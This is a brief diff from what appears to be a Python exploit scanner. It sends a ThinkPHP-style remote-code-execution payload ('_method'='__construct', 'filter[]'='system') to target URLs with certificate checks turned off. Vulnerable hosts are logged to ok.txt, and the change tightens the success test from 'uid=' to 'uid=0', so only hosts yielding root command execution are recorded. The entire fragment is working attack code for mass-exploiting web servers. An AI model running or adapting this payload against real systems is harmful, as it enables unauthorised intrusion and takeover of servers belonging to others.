@@ -14,7 +14,7 @@ data={"_method":"__construct","filter[]":"system","method":"get","server[REQUEST
 
 aa=requests.post(url,headers=headers,data=data,verify=False).text
 
-if "uid=" in str(aa):
+if "uid=0" in str(aa):
 	print ("yes",url)
 	with open("ok.txt",'a') as file: file.write(aa+'\n') 
 else:
